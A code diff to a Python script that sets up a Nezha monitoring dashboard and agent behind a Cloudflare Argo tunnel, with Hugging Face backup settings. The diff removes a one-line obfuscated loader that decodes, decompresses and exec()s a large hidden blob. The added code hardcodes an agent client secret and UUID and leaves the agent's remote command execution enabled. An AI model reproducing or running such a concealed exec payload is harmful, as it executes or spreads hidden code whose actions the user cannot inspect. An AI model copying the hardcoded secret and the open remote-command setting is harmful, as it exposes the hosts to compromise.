@@ -1,4 +1,374 @@
+import subprocess
+import os
+import threading
+import time
+import yaml
+from datetime import datetime
+import signal
+import psutil
+import glob
+import re
+import pytz
 
-# Python 
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+ARGO_DOMAIN = os.environ.get('ARGO_DOMAIN', '') # Argo固定隧道域名,留空即使用临时隧道
+ARGO_AUTH = os.environ.get('ARGO_AUTH', '')  # Argo固定隧道密钥,留空即使用临时隧道
+DASHBOARD_VERSION = os.environ.get('DASHBOARD_VERSION', 'v1.13.2')#	指定面板的版本，以 v0.00.00 的格式，后续将固定在该版本不会升级，不填则使用默认的 v1.13.2
+NZV1_VERSION = os.environ.get('NZV1_VERSION', 'v1.13.1')#  哪吒V1的版本默认v1.13.1
+BACKUP_TIME = os.environ.get('BACKUP_TIME', '10800')# 备份时间 10800秒 2小时
+
+
+HF_USER1 = os.environ.get('HF_USER1', '')# HF 备份仓库的用户名
+HF_REPO	= os.environ.get('HF_REPO', '')#HF 备份的Models仓库名
+HF_EMAIL = os.environ.get('HF_EMAIL', '') #HF的邮箱
+HF_TOKEN1 = os.environ.get('HF_TOKEN1', '')#HF备份账号的TOKEN
+
+HF_USER2 = os.environ.get('HF_USER2', '')# huggingface 用户名
+HF_ID = os.environ.get('HF_ID', '')# huggingface space 名
+HF_TOKEN2 = os.environ.get('HF_TOKEN2', '')# huggingface TOKEN
+#JUPYTER_TOKEN  
+agent_config = {
+    'client_secret': 'MLcD6YnifhoY08B9n129UP5cg2139NYa',
+    'debug': False,
+    'disable_auto_update': True,
+    'disable_command_execute': False,
+    'disable_force_update': False,
+    'disable_nat': False,
+    'disable_send_query': False,
+    'gpu': False,
+    'insecure_tls': False,
+    'ip_report_period': 1800,
+    'report_delay': 3,
+    'self_update_period': 0,
+    'server': f'{ARGO_DOMAIN}:443',
+    'skip_connection_count': False,
+    'skip_procs_count': False,
+    'temperature': True,
+    'tls': True,
+    'use_gitee_to_upgrade': False,
+    'use_ipv6_country_code': False,
+    'uuid': '18a49016-bc2d-4be9-0ddb-5357fdbf0b3d'
+}
+dashboard_config = {
+    'admin_template': 'admin-dist',
+    'agent_secret_key': '',  
+    'avg_ping_count': 2,
+    'cover': 1,
+    'https': {},  # 空字典
+    'install_host': f'{ARGO_DOMAIN}:443',
+    'ip_change_notification_group_id': 0,
+    'jwt_secret_key': '', 
+    'jwt_timeout': 1,
+    'language': 'zh_CN',
+    'listen_port': 8008,
+    'location': 'Asia/Shanghai',
+    'site_name': '鸡子探针平台-柒蓝',
+    'tls': True,
+    'user_template': 'user-dist'
+}
+
+mime_types_content = """types {
+    text/html                             html htm shtml;
+    text/css                              css;
+    text/javascript                       js;
+    image/gif                             gif;
+    image/jpeg                            jpeg jpg;
+    image/png                             png;
+    text/plain                            txt;
+    application/json                      json;
+    application/xml                       xml;
+    application/octet-stream              bin;
+    }"""
+
+stop_event = threading.Event()
+
+def kill_processes():
+    # 要结束的进程名列表
+    target_processes = [
+        'cloudflared-linux-amd64', 
+        'nv1', 
+        'dv1', 
+        'nginx'
+    ]
+    
+    # 存储已结束的进程
+    killed_processes = []
+    
+    # 遍历所有正在运行的进程
+    for proc in psutil.process_iter(['name']):
+        try:
+            # 检查进程名是否在目标列表中
+            if proc.info['name'] in target_processes:
+                # 获取进程ID
+                pid = proc.pid
+                
+                # 先尝试优雅地结束进程
+                proc.terminate()
+                
+                # 等待进程结束
+                try:
+                    proc.wait(timeout=3)
+                except psutil.TimeoutExpired:
+                    # 如果进程未响应，强制杀死
+                    proc.kill()
+                
+                killed_processes.append(f"{proc.info['name']} (PID: {pid})")
+        
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    
+    # 打印已结束的进程
+    if killed_processes:
+        print("已结束以下进程:")
+        for process in killed_processes:
+            print(process)
+    else:
+        print("未找到匹配的进程")
+kill_processes()
+def get_latest_local_package(directory, pattern='*.tar.gz'):
+    try:
+        # 构建完整的搜索路径
+        search_pattern = os.path.join(directory, pattern)
+        
+        # 查找所有匹配的文件
+        files = glob.glob(search_pattern)
+        
+        if not files:
+            print("未找到匹配的 nezha-hf 压缩包")
+            return None
+        
+        # 获取最新的文件
+        latest_file = max(files, key=os.path.getmtime)
+        
+        print(f"找到最新的包: {latest_file}")
+        return latest_file
+    
+    except Exception as e:
+        print(f"获取最新包时发生错误: {e}")
+        return None
+def compress_folder(folder_path, output_dir):
+    try:
+        # 确保输出目录存在
+        os.makedirs(output_dir, exist_ok=True)
+        
+        # 使用 pytz 获取中国时区的当前时间戳（毫秒级）
